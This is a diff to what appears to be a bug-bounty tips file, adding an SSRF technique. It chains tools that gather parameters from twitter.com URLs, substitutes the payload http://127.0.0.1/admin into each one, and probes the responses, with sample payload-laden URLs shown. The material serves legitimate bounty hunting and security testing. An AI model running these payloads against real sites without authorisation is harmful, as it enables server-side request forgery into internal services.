@@ -24,7 +24,39 @@ The use ffuf
 
 **Then get creative with FFuF or https://github.com/tomnomnom/qsreplace**
 
+****
+### SSRF TIP2:
 
+
+#### Generate Wordlist
+**`$ cat "https://www.twitter.com" | getJS -complete | ./wordlistgen -p params.txt -d"www.twitter.com" | tee wordlist`**
+
+```
+OUTPUT:
+
+www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/polyfills.525f28f5.js.map/?url=FUZZ
+www.twitter.com/v/latest/72x72//?url=FUZZ
+www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/en.363b7e25.js.map/?url=FUZZ
+www.twitter.com/articles/18311/?url=FUZZ
+```
+
+##### Replace Variables with Payload
+**`$ cat wordlist | qsreplace http://127.0.0.1/admin | tee -a hosts`**
+
+```
+OUTPUT:
+
+www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/polyfills.525f28f5.js.map/?url=http%3A%2F%2F127.0.0.1%2Fadmin
+www.twitter.com/v/latest/72x72//?url=http%3A%2F%2F127.0.0.1%2Fadmin
+www.twitter.com/responsive-web-internal/sourcemaps/client-web-legacy/en.363b7e25.js.map/?url=http%3A%2F%2F127.0.0.1%2Fadmin
+www.twitter.com/articles/18311/?url=http%3A%2F%2F127.0.0.1%2Fadmin
+```
+
+#### Use HTTPX to keep track of the codes,titles
+**`$ cat hosts | httpx -title -status-code`**
+
+#### I hope you get a bounty with this technique.
+****
 
 
 **If you get a bounty please support by buying me a coffee**
